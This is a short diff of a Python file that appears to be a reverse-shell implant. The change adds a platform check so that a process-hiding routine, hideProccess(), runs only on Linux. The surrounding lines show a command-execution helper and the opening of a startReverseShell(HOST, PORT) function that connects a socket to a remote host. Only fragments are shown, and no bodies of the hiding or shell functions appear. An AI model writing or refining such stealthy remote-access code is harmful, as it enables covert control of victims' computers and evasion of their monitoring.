@@ -8,6 +8,7 @@ import subprocess
 import threading
 import base64
 from typing import Union, Sequence
+import platform
 
 WAIT_TIME = 10
 
@@ -49,7 +50,8 @@ def getOutputOf(command: Union[str, Sequence[str]]) -> str:
     except subprocess.CalledProcessError as e:
         return (e.stdout or e.stderr or "").strip()
 
-hideProccess()
+if platform.system() == "Linux":
+    hideProccess()
 
 def startReverseShell(HOST, PORT):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
